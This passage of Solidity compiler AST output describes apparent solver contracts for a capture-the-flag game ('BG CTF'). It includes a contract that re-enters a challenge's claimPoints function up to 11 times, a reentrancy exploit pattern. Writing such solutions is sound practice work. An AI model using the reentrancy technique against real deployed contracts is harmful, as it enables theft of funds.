constructor","modifiers":[{"arguments":[{"expression":{"id":5604,"name":"msg","nodeType":"Identifier","overloadedDeclarations":[],"referencedDeclaration":-15,"src":"269:3:9","typeDescriptions":{"typeIdentifier":"t_magic_message","typeString":"msg"}},"id":5605,"isConstant":false,"isLValue":false,"isPure":false,"lValueRequested":false,"memberLocation":"273:6:9","memberName":"sender","nodeType":"MemberAccess","src":"269:10:9","typeDescriptions":{"typeIdentifier":"t_address","typeString":"address"}}],"id":5606,"kind":"baseConstructorSpecifier","modifierName":{"id":5603,"name":"Ownable","nameLocations":["261:7:9"],"nodeType":"IdentifierPath","referencedDeclaration":147,"src":"261:7:9"},"nodeType":"ModifierInvocation","src":"261:19:9"}],"name":"","nameLocation":"-1:-1:-1","nodeType":"FunctionDefinition","parameters":{"id":5602,"nodeType":"ParameterList","parameters":[],"src":"258:2:9"},"returnParameters":{"id":5607,"nodeType":"ParameterList","parameters":[],"src":"281:0:9"},"scope":5624,"src":"247:36:9","stateMutability":"nonpayable","virtual":false,"visibility":"public"},{"body":{"id":5622,"nodeType":"Block","src":"342:39:9","statements":[{"expression":{"arguments":[],"expression":{"argumentTypes":[],"expression":{"arguments":[{"id":5617,"name":"target","nodeType":"Identifier","overloadedDeclarations":[],"referencedDeclaration":5611,"src":"356:6:9","typeDescriptions":{"typeIdentifier":"t_address","typeString":"address"}}],"expression":{"argumentTypes":[{"typeIdentifier":"t_address","typeString":"address"}],"id":5616,"name":"ITarget","nodeType":"Identifier","overloadedDeclarations":[],"referencedDeclaration":5628,"src":"348:7:9","typeDescriptions":{"typeIdentifier":"t_type$_t_contract$_ITarget_$5628_$","typeString":"type(contract ITarget)"}},"id":5618,"isConstant":false,"isLValue":false,"isPure":false,"kind":"typeConversion","lValueRequested":false,"nameLocations":[],"names":[],"nodeType":"FunctionCall","src":"348:15:9","tryCall":false,"typeDescriptions":{"typeIdentifier":"t_contract$_ITarget_$5628","typeString":"contract ITarget"}},"id":5619,"isConstant":false,"isLValue":false,"isPure":false,"lValueRequested":false,"memberLocation":"364:10:9","memberName":"justCallMe","nodeType":"MemberAccess","referencedDeclaration":5627,"src":"348:26:9","typeDescriptions":{"typeIdentifier":"t_function_external_nonpayable$__$returns$__$","typeString":"function () external"}},"id":5620,"isConstant":false,"isLValue":false,"isPure":false,"kind":"functionCall","lValueRequested":false,"nameLocations":[],"names":[],"nodeType":"FunctionCall","src":"348:28:9","tryCall":false,"typeDescriptions":{"typeIdentifier":"t_tuple$__$","typeString":"tuple()"}},"id":5621,"nodeType":"ExpressionStatement","src":"348:28:9"}]},"functionSelector":"6ee6199f","id":5623,"implemented":true,"kind":"function","modifiers":[{"id":5614,"kind":"modifierInvocation","modifierName":{"id":5613,"name":"onlyOwner","nameLocations":["332:9:9"],"nodeType":"IdentifierPath","referencedDeclaration":58,"src":"332:9:9"},"nodeType":"ModifierInvocation","src":"332:9:9"}],"name":"indirectCall","nameLocation":"296:12:9","nodeType":"FunctionDefinition","parameters":{"id":5612,"nodeType":"ParameterList","parameters":[{"constant":false,"id":5611,"mutability":"mutable","name":"target","nameLocation":"317:6:9","nodeType":"VariableDeclaration","scope":5623,"src":"309:14:9","stateVariable":false,"storageLocation":"default","typeDescriptions":{"typeIdentifier":"t_address","typeString":"address"},"typeName":{"id":5610,"name":"address","nodeType":"ElementaryTypeName","src":"309:7:9","stateMutability":"nonpayable","typeDescriptions":{"typeIdentifier":"t_address","typeString":"address"}},"visibility":"internal"}],"src":"308:16:9"},"returnParameters":{"id":5615,"nodeType":"ParameterList","parameters":[],"src":"342:0:9"},"scope":5624,"src":"287:94:9","stateMutability":"nonpayable","virtual":false,"visibility":"public"}],"scope":5629,"src":"209:174:9","usedErrors":[13,18],"usedEvents":[24]},{"abstract":false,"baseContracts":[],"canonicalName":"ITarget","contractDependencies":[],"contractKind":"interface","fullyImplemented":false,"id":5628,"linearizedBaseContracts":[5628],"name":"ITarget","nameLocation":"395:7:9","nodeType":"ContractDefinition","nodes":[{"functionSelector":"82cb05c6","id":5627,"implemented":false,"kind":"function","modifiers":[],"name":"justCallMe","nameLocation":"416:10:9","nodeType":"FunctionDefinition","parameters":{"id":5625,"nodeType":"ParameterList","parameters":[],"src":"426:2:9"},"returnParameters":{"id":5626,"nodeType":"ParameterList","parameters":[],"src":"437:0:9"},"scope":5628,"src":"407:31:9","stateMutability":"nonpayable","virtual":false,"visibility":"external"}],"scope":5629,"src":"385:55:9","usedErrors":[],"usedEvents":[]}],"src":"39:402:9"},"id":9},"contracts/CtfChallenge3.sol":{"ast":{"absolutePath":"contracts/CtfChallenge3.sol","exportedSymbols":{"CtfChallenge3":[5651],"ITarget":[5655],"Ownable":[147]},"id":5656,"license":"UNLICENSED","nodeType":"SourceUnit","nodes":[{"id":5630,"literals":["solidity","^","0.8",".28"],"nodeType":"PragmaDirective","src":"39:24:10"},{"absolutePath":"@openzeppelin/contracts/access/Ownable.sol","file":"@openzeppelin/contracts/access/Ownable.sol","id":5632,"nameLocation":"-1:-1:-1","nodeType":"ImportDirective","scope":5656,"sourceUnit":148,"src":"64:67:10","symbolAliases":[{"foreign":{"id":5631,"name":"Ownable","nodeType":"Identifier","overloadedDeclarations":[],"referencedDeclaration":147,"src":"72:7:10","typeDescriptions":{}},"nameLocation":"-1:-1:-1"}],"unitAlias":""},{"abstract":false,"baseContracts":[{"baseName":{"id":5633,"name":"Ownable","nameLocations":["235:7:10"],"nodeType":"IdentifierPath","referencedDeclaration":147,"src":"235:7:10"},"id":5634,"nodeType":"InheritanceSpecifier","src":"235:7:10"}],"canonicalName":"CtfChallenge3","contractDependencies":[],"contractKind":"contract","fullyImplemented":true,"id":5651,"linearizedBaseContracts":[5651,147,177],"name":"CtfChallenge3","nameLocation":"218:13:10","nodeType":"ContractDefinition","nodes":[{"body":{"id":5649,"nodeType":"Block","src":"295:37:10","statements":[{"expression":{"arguments":[],"expression":{"argumentTypes":[],"expression":{"arguments":[{"id":5644,"name":"target","nodeType":"Identifier","overloadedDeclarations":[],"referencedDeclaration":5636,"src":"309:6:10","typeDescriptions":{"typeIdentifier":"t_address","typeString":"address"}}],"expression":{"argumentTypes":[{"typeIdentifier":"t_address","typeString":"address"}],"id":5643,"name":"ITarget","nodeType":"Identifier","overloadedDeclarations":[],"referencedDeclaration":5655,"src":"301:7:10","typeDescriptions":{"typeIdentifier":"t_type$_t_contract$_ITarget_$5655_$","typeString":"type(contract ITarget)"}},"id":5645,"isConstant":false,"isLValue":false,"isPure":false,"kind":"typeConversion","lValueRequested":false,"nameLocations":[],"names":[],"nodeType":"FunctionCall","src":"301:15:10","tryCall":false,"typeDescriptions":{"typeIdentifier":"t_contract$_ITarget_$5655","typeString":"contract ITarget"}},"id":5646,"isConstant":false,"isLValue":false,"isPure":false,"lValueRequested":false,"memberLocation":"317:8:10","memberName":"mintFlag","nodeType":"MemberAccess","referencedDeclaration":5654,"src":"301:24:10","typeDescriptions":{"typeIdentifier":"t_function_external_nonpayable$__$returns$__$","typeString":"function () external"}},"id":5647,"isConstant":false,"isLValue":false,"isPure":false,"kind":"functionCall","lValueRequested":false,"nameLocations":[],"names":[],"nodeType":"FunctionCall","src":"301:26:10","tryCall":false,"typeDescriptions":{"typeIdentifier":"t_tuple$__$","typeString":"tuple()"}},"id":5648,"nodeType":"ExpressionStatement","src":"301:26:10"}]},"id":5650,"implemented":true,"kind":"constructor","modifiers":[{"arguments":[{"expression":{"id":5639,"name":"msg","nodeType":"Identifier","overloadedDeclarations":[],"referencedDeclaration":-15,"src":"283:3:10","typeDescriptions":{"typeIdentifier":"t_magic_message","typeString":"msg"}},"id":5640,"isConstant":false,"isLValue":false,"isPure":false,"lValueRequested":false,"memberLocation":"287:6:10","memberName":"sender","nodeType":"MemberAccess","src":"283:10:10","typeDescriptions":{"typeIdentifier":"t_address","typeString":"address"}}],"id":5641,"kind":"baseConstructorSpecifier","modifierName":{"id":5638,"name":"Ownable","nameLocations":["275:7:10"],"nodeType":"IdentifierPath","referencedDeclaration":147,"src":"275:7:10"},"nodeType":"ModifierInvocation","src":"275:19:10"}],"name":"","nameLocation":"-1:-1:-1","nodeType":"FunctionDefinition","parameters":{"id":5637,"nodeType":"ParameterList","parameters":[{"constant":false,"id":5636,"mutability":"mutable","name":"target","nameLocation":"267:6:10","nodeType":"VariableDeclaration","scope":5650,"src":"259:14:10","stateVariable":false,"storageLocation":"default","typeDescriptions":{"typeIdentifier":"t_address","typeString":"address"},"typeName":{"id":5635,"name":"address","nodeType":"ElementaryTypeName","src":"259:7:10","stateMutability":"nonpayable","typeDescriptions":{"typeIdentifier":"t_address","typeString":"address"}},"visibility":"internal"}],"src":"258:16:10"},"returnParameters":{"id":5642,"nodeType":"ParameterList","parameters":[],"src":"295:0:10"},"scope":5651,"src":"247:85:10","stateMutability":"nonpayable","virtual":false,"visibility":"public"}],"scope":5656,"src":"209:126:10","usedErrors":[13,18],"usedEvents":[24]},{"abstract":false,"baseContracts":[],"canonicalName":"ITarget","contractDependencies":[],"contractKind":"interface","fullyImplemented":false,"id":5655,"linearizedBaseContracts":[5655],"name":"ITarget","nameLocation":"347:7:10","nodeType":"ContractDefinition","nodes":[{"functionSelector":"e00d023f","id":5654,"implemented":false,"kind":"function","modifiers":[],"name":"mintFlag","nameLocation":"368:8:10","nodeType":"FunctionDefinition","parameters":{"id":5652,"nodeType":"ParameterList","parameters":[],"src":"376:2:10"},"returnParameters":{"id":5653,"nodeType":"ParameterList","parameters":[],"src":"387:0:10"},"scope":5655,"src":"359:29:10","stateMutability":"nonpayable","virtual":false,"visibility":"external"}],"scope":5656,"src":"337:53:10","usedErrors":[],"usedEvents":[]}],"src":"39:352:10"},"id":10},"contracts/CtfChallenge4.sol":{"ast":{"absolutePath":"contracts/CtfChallenge4.sol","exportedSymbols":{"Context":[177],"CtfChallenge4":[5700],"ECDSA":[1979],"MessageHashUtils":[2065],"Ownable":[147],"Strings":[1631]},"id":5701,"license":"UNLICENSED","nodeType":"SourceUnit","nodes":[{"id":5657,"literals":["solidity","^","0.8",".28"],"nodeType":"PragmaDirective","src":"39:24:11"},{"absolutePath":"@openzeppelin/contracts/access/Ownable.sol","file":"@openzeppelin/contracts/access/Ownable.sol","id":5658,"nameLocation":"-1:-1:-1","nodeType":"ImportDirective","scope":5701,"sourceUnit":148,"src":"65:52:11","symbolAliases":[],"unitAlias":""},{"absolutePath":"@openzeppelin/contracts/utils/cryptography/MessageHashUtils.sol","file":"@openzeppelin/contracts/utils/cryptography/MessageHashUtils.sol","id":5659,"nameLocation":"-1:-1:-1","nodeType":"ImportDirective","scope":5701,"sourceUnit":2066,"src":"118:73:11","symbolAliases":[],"unitAlias":""},{"absolutePath":"@openzeppelin/contracts/utils/cryptography/ECDSA.sol","file":"@openzeppelin/contracts/utils/cryptography/ECDSA.sol","id":5660,"nameLocation":"-1:-1:-1","nodeType":"ImportDirective","scope":5701,"sourceUnit":1980,"src":"192:62:11","symbolAliases":[],"unitAlias":""},{"abstract":false,"baseContracts":[],"canonicalName":"CtfChallenge4","contractDependencies":[],"contractKind":"contract","fullyImplemented":true,"id":5700,"linearizedBaseContracts":[5700],"name":"CtfChallenge4","nameLocation":"265:13:11","nodeType":"ContractDefinition","nodes":[{"global":false,"id":5663,"libraryName":{"id":5661,"name":"ECDSA","nameLocations":["291:5:11"],"nodeType":"IdentifierPath","referencedDeclaration":1979,"src":"291:5:11"},"nodeType":"UsingForDirective","src":"285:24:11","typeName":{"id":5662,"name":"bytes32","nodeType":"ElementaryTypeName","src":"301:7:11","typeDescriptions":{"typeIdentifier":"t_bytes32","typeString":"bytes32"}}},{"global":false,"id":5666,"libraryName":{"id":5664,"name":"MessageHashUtils","nameLocations":["320:16:11"],"nodeType":"IdentifierPath","referencedDeclaration":2065,"src":"320:16:11"},"nodeType":"UsingForDirective","src":"314:35:11","typeName":{"id":5665,"name":"bytes32","nodeType":"ElementaryTypeName","src":"341:7:11","typeDescriptions":{"typeIdentifier":"t_bytes32","typeString":"bytes32"}}},{"anonymous":false,"eventSelector":"3d7cf2e7e9e20d5274ee168f6f51d48502ab06f1d11a284e66b34b7c09e5ad1e","id":5670,"name":"HashCalculated","nameLocation":"361:14:11","nodeType":"EventDefinition","parameters":{"id":5669,"nodeType":"ParameterList","parameters":[{"constant":false,"id":5668,"indexed":false,"mutability":"mutable","name":"theHash","nameLocation":"384:7:11","nodeType":"VariableDeclaration","scope":5670,"src":"376:15:11","stateVariable":false,"storageLocation":"default","typeDescriptions":{"typeIdentifier":"t_bytes32","typeString":"bytes32"},"typeName":{"id":5667,"name":"bytes32","nodeType":"ElementaryTypeName","src":"376:7:11","typeDescriptions":{"typeIdentifier":"t_bytes32","typeString":"bytes32"}},"visibility":"internal"}],"src":"375:17:11"},"src":"355:38:11"},{"body":{"id":5698,"nodeType":"Block","src":"444:207:11","statements":[{"assignments":[5676],"declarations":[{"constant":false,"id":5676,"mutability":"mutable","name":"message","nameLocation":"463:7:11","nodeType":"VariableDeclaration","scope":5698,"src":"455:15:11","stateVariable":false,"storageLocation":"default","typeDescriptions":{"typeIdentifier":"t_bytes32","typeString":"bytes32"},"typeName":{"id":5675,"name":"bytes32","nodeType":"ElementaryTypeName","src":"455:7:11","typeDescriptions":{"typeIdentifier":"t_bytes32","typeString":"bytes32"}},"visibility":"internal"}],"id":5685,"initialValue":{"arguments":[{"arguments":[{"hexValue":"424720435446204368616c6c656e67652034","id":5680,"isConstant":false,"isLValue":false,"isPure":true,"kind":"string","lValueRequested":false,"nodeType":"Literal","src":"494:20:11","typeDescriptions":{"typeIdentifier":"t_stringliteral_38777f455e8ab328a5121c93338c7f776bc7795f9d694c7d69158cf70a94c644","typeString":"literal_string \"BG CTF Challenge 4\""},"value":"BG CTF Challenge 4"},{"expression":{"id":5681,"name":"msg","nodeType":"Identifier","overloadedDeclarations":[],"referencedDeclaration":-15,"src":"516:3:11","typeDescriptions":{"typeIdentifier":"t_magic_message","typeString":"msg"}},"id":5682,"isConstant":false,"isLValue":false,"isPure":false,"lValueRequested":false,"memberLocation":"520:6:11","memberName":"sender","nodeType":"MemberAccess","src":"516:10:11","typeDescriptions":{"typeIdentifier":"t_address","typeString":"address"}}],"expression":{"argumentTypes":[{"typeIdentifier":"t_stringliteral_38777f455e8ab328a5121c93338c7f776bc7795f9d694c7d69158cf70a94c644","typeString":"literal_string \"BG CTF Challenge 4\""},{"typeIdentifier":"t_address","typeString":"address"}],"expression":{"id":5678,"name":"abi","nodeType":"Identifier","overloadedDeclarations":[],"referencedDeclaration":-1,"src":"483:3:11","typeDescriptions":{"typeIdentifier":"t_magic_abi","typeString":"abi"}},"id":5679,"isConstant":false,"isLValue":false,"isPure":true,"lValueRequested":false,"memberLocation":"487:6:11","memberName":"encode","nodeType":"MemberAccess","src":"483:10:11","typeDescriptions":{"typeIdentifier":"t_function_abiencode_pure$__$returns$_t_bytes_memory_ptr_$","typeString":"function () pure returns (bytes memory)"}},"id":5683,"isConstant":false,"isLValue":false,"isPure":false,"kind":"functionCall","lValueRequested":false,"nameLocations":[],"names":[],"nodeType":"FunctionCall","src":"483:44:11","tryCall":false,"typeDescriptions":{"typeIdentifier":"t_bytes_memory_ptr","typeString":"bytes memory"}}],"expression":{"argumentTypes":[{"typeIdentifier":"t_bytes_memory_ptr","typeString":"bytes memory"}],"id":5677,"name":"keccak256","nodeType":"Identifier","overloadedDeclarations":[],"referencedDeclaration":-8,"src":"473:9:11","typeDescriptions":{"typeIdentifier":"t_function_keccak256_pure$_t_bytes_memory_ptr_$returns$_t_bytes32_$","typeString":"function (bytes memory) pure returns (bytes32)"}},"id":5684,"isConstant":false,"isLValue":false,"isPure":false,"kind":"functionCall","lValueRequested":false,"nameLocations":[],"names":[],"nodeType":"FunctionCall","src":"473:55:11","tryCall":false,"typeDescriptions":{"typeIdentifier":"t_bytes32","typeString":"bytes32"}},"nodeType":"VariableDeclarationStatement","src":"455:73:11"},{"assignments":[5687],"declarations":[{"constant":false,"id":5687,"mutability":"mutable","name":"hash","nameLocation":"546:4:11","nodeType":"VariableDeclaration","scope":5698,"src":"538:12:11","stateVariable":false,"storageLocation":"default","typeDescriptions":{"typeIdentifier":"t_bytes32","typeString":"bytes32"},"typeName":{"id":5686,"name":"bytes32","nodeType":"ElementaryTypeName","src":"538:7:11","typeDescriptions":{"typeIdentifier":"t_bytes32","typeString":"bytes32"}},"visibility":"internal"}],"id":5691,"initialValue":{"arguments":[],"expression":{"argumentTypes":[],"expression":{"id":5688,"name":"message","nodeType":"Identifier","overloadedDeclarations":[],"referencedDeclaration":5676,"src":"553:7:11","typeDescriptions":{"typeIdentifier":"t_bytes32","typeString":"bytes32"}},"id":5689,"isConstant":false,"isLValue":false,"isPure":false,"lValueRequested":false,"memberLocation":"561:22:11","memberName":"toEthSignedMessageHash","nodeType":"MemberAccess","referencedDeclaration":1994,"src":"553:30:11","typeDescriptions":{"typeIdentifier":"t_function_internal_pure$_t_bytes32_$returns$_t_bytes32_$attached_to$_t_bytes32_$","typeString":"function (bytes32) pure returns (bytes32)"}},"id":5690,"isConstant":false,"isLValue":false,"isPure":false,"kind":"functionCall","lValueRequested":false,"nameLocations":[],"names":[],"nodeType":"FunctionCall","src":"553:32:11","tryCall":false,"typeDescriptions":{"typeIdentifier":"t_bytes32","typeString":"bytes32"}},"nodeType":"VariableDeclarationStatement","src":"538:47:11"},{"eventCall":{"arguments":[{"id":5693,"name":"hash","nodeType":"Identifier","overloadedDeclarations":[],"referencedDeclaration":5687,"src":"616:4:11","typeDescriptions":{"typeIdentifier":"t_bytes32","typeString":"bytes32"}}],"expression":{"argumentTypes":[{"typeIdentifier":"t_bytes32","typeString":"bytes32"}],"id":5692,"name":"HashCalculated","nodeType":"Identifier","overloadedDeclarations":[],"referencedDeclaration":5670,"src":"601:14:11","typeDescriptions":{"typeIdentifier":"t_function_event_nonpayable$_t_bytes32_$returns$__$","typeString":"function (bytes32)"}},"id":5694,"isConstant":false,"isLValue":false,"isPure":false,"kind":"functionCall","lValueRequested":false,"nameLocations":[],"names":[],"nodeType":"FunctionCall","src":"601:20:11","tryCall":false,"typeDescriptions":{"typeIdentifier":"t_tuple$__$","typeString":"tuple()"}},"id":5695,"nodeType":"EmitStatement","src":"596:25:11"},{"expression":{"id":5696,"name":"hash","nodeType":"Identifier","overloadedDeclarations":[],"referencedDeclaration":5687,"src":"639:4:11","typeDescriptions":{"typeIdentifier":"t_bytes32","typeString":"bytes32"}},"functionReturnParameters":5674,"id":5697,"nodeType":"Return","src":"632:11:11"}]},"functionSelector":"e00d023f","id":5699,"implemented":true,"kind":"function","modifiers":[],"name":"mintFlag","nameLocation":"408:8:11","nodeType":"FunctionDefinition","parameters":{"id":5671,"nodeType":"ParameterList","parameters":[],"src":"416:2:11"},"returnParameters":{"id":5674,"nodeType":"ParameterList","parameters":[{"constant":false,"id":5673,"mutability":"mutable","name":"","nameLocation":"-1:-1:-1","nodeType":"VariableDeclaration","scope":5699,"src":"435:7:11","stateVariable":false,"storageLocation":"default","typeDescriptions":{"typeIdentifier":"t_bytes32","typeString":"bytes32"},"typeName":{"id":5672,"name":"bytes32","nodeType":"ElementaryTypeName","src":"435:7:11","typeDescriptions":{"typeIdentifier":"t_bytes32","typeString":"bytes32"}},"visibility":"internal"}],"src":"434:9:11"},"scope":5700,"src":"399:252:11","stateMutability":"nonpayable","virtual":false,"visibility":"public"}],"scope":5701,"src":"256:397:11","usedErrors":[],"usedEvents":[5670]}],"src":"39:615:11"},"id":11},"contracts/CtfChallenge5.sol":{"ast":{"absolutePath":"contracts/CtfChallenge5.sol","exportedSymbols":{"CtfChallenge5":[5761],"IChallenge5":[5771]},"id":5772,"license":"UNLICENSED","nodeType":"SourceUnit","nodes":[{"id":5702,"literals":["solidity","^","0.8",".28"],"nodeType":"PragmaDirective","src":"39:24:12"},{"abstract":false,"baseContracts":[],"canonicalName":"CtfChallenge5","contractDependencies":[],"contractKind":"contract","fullyImplemented":true,"id":5761,"linearizedBaseContracts":[5761],"name":"CtfChallenge5","nameLocation":"74:13:12","nodeType":"ContractDefinition","nodes":[{"constant":false,"functionSelector":"d2ef7398","id":5705,"mutability":"mutable","name":"challenge","nameLocation":"113:9:12","nodeType":"VariableDeclaration","scope":5761,"src":"94:28:12","stateVariable":true,"storageLocation":"default","typeDescriptions":{"typeIdentifier":"t_contract$_IChallenge5_$5771","typeString":"contract IChallenge5"},"typeName":{"id":5704,"nodeType":"UserDefinedTypeName","pathNode":{"id":5703,"name":"IChallenge5","nameLocations":["94:11:12"],"nodeType":"IdentifierPath","referencedDeclaration":5771,"src":"94:11:12"},"referencedDeclaration":5771,"src":"94:11:12","typeDescriptions":{"typeIdentifier":"t_contract$_IChallenge5_$5771","typeString":"contract IChallenge5"}},"visibility":"public"},{"constant":false,"functionSelector":"4b28f9a2","id":5707,"mutability":"mutable","name":"callCount","nameLocation":"143:9:12","nodeType":"VariableDeclaration","scope":5761,"src":"128:24:12","stateVariable":true,"storageLocation":"default","typeDescriptions":{"typeIdentifier":"t_uint256","typeString":"uint256"},"typeName":{"id":5706,"name":"uint256","nodeType":"ElementaryTypeName","src":"128:7:12","typeDescriptions":{"typeIdentifier":"t_uint256","typeString":"uint256"}},"visibility":"public"},{"constant":true,"functionSelector":"cc1f2afa","id":5710,"mutability":"constant","name":"TARGET","nameLocation":"182:6:12","nodeType":"VariableDeclaration","scope":5761,"src":"158:35:12","stateVariable":true,"storageLocation":"default","typeDescriptions":{"typeIdentifier":"t_uint256","typeString":"uint256"},"typeName":{"id":5708,"name":"uint256","nodeType":"ElementaryTypeName","src":"158:7:12","typeDescriptions":{"typeIdentifier":"t_uint256","typeString":"uint256"}},"value":{"hexValue":"3131","id":5709,"isConstant":false,"isLValue":false,"isPure":true,"kind":"number","lValueRequested":false,"nodeType":"Literal","src":"191:2:12","typeDescriptions":{"typeIdentifier":"t_rational_11_by_1","typeString":"int_const 11"},"value":"11"},"visibility":"public"},{"anonymous":false,"eventSelector":"3033a984c3a0a51e441cbe8622691a481162cd52ed135fda3b44d554a150a214","id":5712,"name":"recieveCalled","nameLocation":"206:13:12","nodeType":"EventDefinition","parameters":{"id":5711,"nodeType":"ParameterList","parameters":[],"src":"219:2:12"},"src":"200:22:12"},{"anonymous":false,"eventSelector":"aa2c4b028215fe6f0ac7c05fa2b46527453b4b09a7951f44036ac62905a7e4d0","id":5714,"name":"fallbackCalled","nameLocation":"233:14:12","nodeType":"EventDefinition","parameters":{"id":5713,"nodeType":"ParameterList","parameters":[],"src":"247:2:12"},"src":"227:23:12"},{"body":{"id":5725,"nodeType":"Block","src":"295:59:12","statements":[{"expression":{"id":5723,"isConstant":false,"isLValue":false,"isPure":false,"lValueRequested":false,"leftHandSide":{"id":5719,"name":"challenge","nodeType":"Identifier","overloadedDeclarations":[],"referencedDeclaration":5705,"src":"305:9:12","typeDescriptions":{"typeIdentifier":"t_contract$_IChallenge5_$5771","typeString":"contract IChallenge5"}},"nodeType":"Assignment","operator":"=","rightHandSide":{"arguments":[{"id":5721,"name":"_challengeAddress","nodeType":"Identifier","overloadedDeclarations":[],"referencedDeclaration":5716,"src":"329:17:12","typeDescriptions":{"typeIdentifier":"t_address","typeString":"address"}}],"expression":{"argumentTypes":[{"typeIdentifier":"t_address","typeString":"address"}],"id":5720,"name":"IChallenge5","nodeType":"Identifier","overloadedDeclarations":[],"referencedDeclaration":5771,"src":"317:11:12","typeDescriptions":{"typeIdentifier":"t_type$_t_contract$_IChallenge5_$5771_$","typeString":"type(contract IChallenge5)"}},"id":5722,"isConstant":false,"isLValue":false,"isPure":false,"kind":"typeConversion","lValueRequested":false,"nameLocations":[],"names":[],"nodeType":"FunctionCall","src":"317:30:12","tryCall":false,"typeDescriptions":{"typeIdentifier":"t_contract$_IChallenge5_$5771","typeString":"contract IChallenge5"}},"src":"305:42:12","typeDescriptions":{"typeIdentifier":"t_contract$_IChallenge5_$5771","typeString":"contract IChallenge5"}},"id":5724,"nodeType":"ExpressionStatement","src":"305:42:12"}]},"id":5726,"implemented":true,"kind":"constructor","modifiers":[],"name":"","nameLocation":"-1:-1:-1","nodeType":"FunctionDefinition","parameters":{"id":5717,"nodeType":"ParameterList","parameters":[{"constant":false,"id":5716,"mutability":"mutable","name":"_challengeAddress","nameLocation":"276:17:12","nodeType":"VariableDeclaration","scope":5726,"src":"268:25:12","stateVariable":false,"storageLocation":"default","typeDescriptions":{"typeIdentifier":"t_address","typeString":"address"},"typeName":{"id":5715,"name":"address","nodeType":"ElementaryTypeName","src":"268:7:12","stateMutability":"nonpayable","typeDescriptions":{"typeIdentifier":"t_address","typeString":"address"}},"visibility":"internal"}],"src":"267:27:12"},"returnParameters":{"id":5718,"nodeType":"ParameterList","parameters":[],"src":"295:0:12"},"scope":5761,"src":"256:98:12","stateMutability":"nonpayable","virtual":false,"visibility":"public"},{"body":{"id":5738,"nodeType":"Block","src":"391:63:12","statements":[{"expression":{"id":5731,"isConstant":false,"isLValue":false,"isPure":false,"lValueRequested":false,"leftHandSide":{"id":5729,"name":"callCount","nodeType":"Identifier","overloadedDeclarations":[],"referencedDeclaration":5707,"src":"401:9:12","typeDescriptions":{"typeIdentifier":"t_uint256","typeString":"uint256"}},"nodeType":"Assignment","operator":"=","rightHandSide":{"hexValue":"30","id":5730,"isConstant":false,"isLValue":false,"isPure":true,"kind":"number","lValueRequested":false,"nodeType":"Literal","src":"413:1:12","typeDescriptions":{"typeIdentifier":"t_rational_0_by_1","typeString":"int_const 0"},"value":"0"},"src":"401:13:12","typeDescriptions":{"typeIdentifier":"t_uint256","typeString":"uint256"}},"id":5732,"nodeType":"ExpressionStatement","src":"401:13:12"},{"expression":{"arguments":[],"expression":{"argumentTypes":[],"expression":{"id":5733,"name":"challenge","nodeType":"Identifier","overloadedDeclarations":[],"referencedDeclaration":5705,"src":"424:9:12","typeDescriptions":{"typeIdentifier":"t_contract$_IChallenge5_$5771","typeString":"contract IChallenge5"}},"id":5735,"isConstant":false,"isLValue":false,"isPure":false,"lValueRequested":false,"memberLocation":"434:11:12","memberName":"claimPoints","nodeType":"MemberAccess","referencedDeclaration":5764,"src":"424:21:12","typeDescriptions":{"typeIdentifier":"t_function_external_nonpayable$__$returns$__$","typeString":"function () external"}},"id":5736,"isConstant":false,"isLValue":false,"isPure":false,"kind":"functionCall","lValueRequested":false,"nameLocations":[],"names":[],"nodeType":"FunctionCall","src":"424:23:12","tryCall":false,"typeDescriptions":{"typeIdentifier":"t_tuple$__$","typeString":"tuple()"}},"id":5737,"nodeType":"ExpressionStatement","src":"424:23:12"}]},"functionSelector":"ecbfc077","id":5739,"implemented":true,"kind":"function","modifiers":[],"name":"startClaim","nameLocation":"369:10:12","nodeType":"FunctionDefinition","parameters":{"id":5727,"nodeType":"ParameterList","parameters":[],"src":"379:2:12"},"returnParameters":{"id":5728,"nodeType":"ParameterList","parameters":[],"src":"391:0:12"},"scope":5761,"src":"360:94:12","stateMutability":"nonpayable","virtual":false,"visibility":"external"},{"body":{"id":5755,"nodeType":"Block","src":"487:146:12","statements":[{"condition":{"commonType":{"typeIdentifier":"t_uint256","typeString":"uint256"},"id":5744,"isConstant":false,"isLValue":false,"isPure":false,"lValueRequested":false,"leftExpression":{"id":5742,"name":"callCount","nodeType":"Identifier","overloadedDeclarations":[],"referencedDeclaration":5707,"src":"534:9:12","typeDescriptions":{"typeIdentifier":"t_uint256","typeString":"uint256"}},"nodeType":"BinaryOperation","operator":"<","rightExpression":{"id":5743,"name":"TARGET","nodeType":"Identifier","overloadedDeclarations":[],"referencedDeclaration":5710,"src":"546:6:12","typeDescriptions":{"typeIdentifier":"t_uint256","typeString":"uint256"}},"src":"534:18:12","typeDescriptions":{"typeIdentifier":"t_bool","typeString":"bool"}},"id":5754,"nodeType":"IfStatement","src":"530:97:12","trueBody":{"id":5753,"nodeType":"Block","src":"554:73:12","statements":[{"expression":{"id":5746,"isConstant":false,"isLValue":false,"isPure":false,"lValueRequested":false,"nodeType":"UnaryOperation","operator":"++","prefix":false,"src":"568:11:12","subExpression":{"id":5745,"name":"callCount","nodeType":"Identifier","overloadedDeclarations":[],"referencedDeclaration":5707,"src":"568:9:12","typeDescriptions":{"typeIdentifier":"t_uint256","typeString":"uint256"}},"typeDescriptions":{"typeIdentifier":"t_uint256","typeString":"uint256"}},"id":5747,"nodeType":"ExpressionStatement","src":"568:11:12"},{"expression":{"arguments":[],"expression":{"argumentTypes":[],"expression":{"id":5748,"name":"challenge","nodeType":"Identifier","overloadedDeclarations":[],"referencedDeclaration":5705,"src":"593:9:12","typeDescriptions":{"typeIdentifier":"t_contract$_IChallenge5_$5771","typeString":"contract IChallenge5"}},"id":5750,"isConstant":false,"isLValue":false,"isPure":false,"lValueRequested":false,"memberLocation":"603:11:12","memberName":"claimPoints","nodeType":"MemberAccess","referencedDeclaration":5764,"src":"593:21:12","typeDescriptions":{"typeIdentifier":"t_function_external_nonpayable$__$returns$__$","typeString":"function () 